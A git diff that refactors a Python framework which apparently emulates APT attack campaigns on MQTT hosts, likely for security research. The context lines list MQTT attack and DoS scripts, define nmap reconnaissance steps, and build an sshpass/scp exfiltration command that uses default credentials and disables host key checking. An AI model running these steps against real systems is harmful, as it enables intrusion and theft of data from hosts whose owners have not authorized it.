@@ -16,6 +16,7 @@ from typing import Optional, List, Dict, Tuple, Literal
 
 
 def show_progress(transferred_bytes: int, total_bytes: int) -> None:
+    """Callback method to show progress on file transfer with SFTP"""
     print(f"Transfer progress: {transferred_bytes}/{total_bytes}", flush=True)
 
 
@@ -79,8 +80,11 @@ class InstStep(APTStep, ABC):
         super().__init__(hostname, pause)
         if src_files is None:
             self.src_files = ["/dollar_char_attack.py", "/empty_connection_dos.py", "/pub_exfiltration.py",
-                              "/qos_mid_dos.py", "/slash_char_attack.py", "/user_property_attack.py", "/zero_len_attack.py",
+                              "/qos_mid_dos.py", "/slash_char_attack.py", "/user_property_attack.py",
+                              "/zero_len_attack.py",
                               "/mqtt_utilities.py"]
+        else:
+            self.src_files = src_files
         self.dest_dir = dest_dir
         self.ssh_username = ssh_username
         self.ssh_password = ssh_password
@@ -211,7 +215,7 @@ class RecStep(APTStep):
         return APTPhase.RECONNAISSANCE
 
 
-class NetstatStep(RecStep):
+class NetstatRecStep(RecStep):
     """Python class implementing reconnaissance with netstat"""
 
     def __init__(self, pause: float = 1):
@@ -222,7 +226,7 @@ class NetstatStep(RecStep):
         return "netstat"
 
 
-class Nmap10T4Step(RecStep):
+class Nmap10T4RecStep(RecStep):
     """Python class implementing reconnaissance with nmap assuming a network topology of type A with speed T4"""
 
     def __init__(self, pause: float = 1):
@@ -233,7 +237,7 @@ class Nmap10T4Step(RecStep):
         return "nmap_10_T4"
 
 
-class Nmap192T4Step(RecStep):
+class Nmap192T4RecStep(RecStep):
     """Python class implementing reconnaissance with nmap assuming a network topology of type C with speed T4"""
 
     def __init__(self, pause: float = 1):
@@ -244,7 +248,7 @@ class Nmap192T4Step(RecStep):
         return "nmap_192_T4"
 
 
-class Nmap10T5Step(RecStep):
+class Nmap10T5RecStep(RecStep):
     """Python class implementing reconnaissance with nmap assuming a network topology of type A with speed T5"""
 
     def __init__(self, pause: float = 1):
@@ -255,7 +259,7 @@ class Nmap10T5Step(RecStep):
         return "nmap_10_T5"
 
 
-class Nmap192T5Step(RecStep):
+class Nmap192T5RecStep(RecStep):
     """Python class implementing reconnaissance with nmap assuming a network topology of type C with speed T5"""
 
     def __init__(self, pause: float = 1):
@@ -373,11 +377,12 @@ class ExploitStep(APTStep, ABC):
         return [result]
 
 
-class ScpExfiltrateStep(ExploitStep):
+class ScpExfExploit(ExploitStep):
     """Exfiltrate data from a specified host to the local filesystem"""
 
     def __init__(self, hostname: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", src_file: str = "/home/ope/to_be_exfiltrated", dest_file="./scp_exfiltrated_data",
+                 ssh_password: str = "maint", src_file: str = "/home/ope/to_be_exfiltrated",
+                 dest_file="./scp_exfiltrated_data",
                  timeout: float = 0, pause: float = 1):
         super().__init__(hostname, None, None, ssh_username, ssh_password, timeout, pause)
         self.src_file = src_file
@@ -391,7 +396,7 @@ class ScpExfiltrateStep(ExploitStep):
             f'sshpass -p "{self.ssh_password}" scp -o StrictHostKeyChecking=no {self.ssh_username}@{self.hostname}:{self.src_file} {self.dest_file} | tee -a ./out.log')
 
 
-class SftpExfiltrateStep(ExploitStep):
+class SftpExfExploit(ExploitStep):
     """Exfiltrate data from a specified host using a preinstalled sftp server and the ssh credentials"""
 
     def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint",
@@ -671,7 +676,7 @@ class APTAttack:
 
 
 class APTSequence:
-    """Chains and runs the APT attacks so their step number follow each other. They must share a same exp_details list of dicts"""
+    """Chains and runs the APT attacks so their step number follow each other. They must share the same exp_details list of dicts"""
 
     def __init__(self, attacks: List[Tuple[APTAttack, int]]):
         self.attacks = attacks
